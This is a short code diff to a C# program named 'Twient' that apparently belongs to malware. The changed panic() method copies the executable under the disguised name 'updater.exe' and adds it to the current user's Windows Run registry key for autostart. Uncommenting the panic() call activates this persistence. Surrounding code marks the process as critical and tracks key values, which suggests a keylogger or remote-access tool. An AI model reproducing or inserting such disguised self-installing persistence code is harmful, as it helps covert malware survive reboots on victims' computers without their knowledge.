@@ -108,15 +108,20 @@ namespace Twient
 		
 		private static void panic(string filepath)
 		{
-			CheckProcess();
-			//File.Copy(text, GlobalVars.Autostart + "\\updater.exe");
+			CheckProcess();			
 			if (File.Exists(GlobalVars.Backpath + "\\updater.exe")==false)
-				File.Copy(filepath, GlobalVars.Backpath + "\\updater.exe");
-			RegistryKey rk = Registry.LocalMachine;
-            RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
-            rk2.SetValue("updater", GlobalVars.Backpath + "\\updater.exe");
-            rk2.Close();
-            rk.Close();
+				File.Copy(filepath, GlobalVars.Backpath + "\\updater.exe");			
+			RegistryKey local = Registry.CurrentUser;
+			try
+			{
+				RegistryKey run = local.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
+				run.SetValue("updater", GlobalVars.Backpath + "\\updater.exe");				
+				local.Close();
+			}
+			catch (Exception ex)
+			{
+				MessageBox.Show(ex.Message.ToString(), "Info", MessageBoxButtons.OK, MessageBoxIcon.Error);
+			}
 			
 		}
 		
@@ -139,7 +144,7 @@ namespace Twient
 					Functions.SetCritical(0);
 					Environment.Exit(0);
 				}
-				//panic(filepath);			
+				panic(filepath);			
 				
 				if (key!=last_key)
 				{
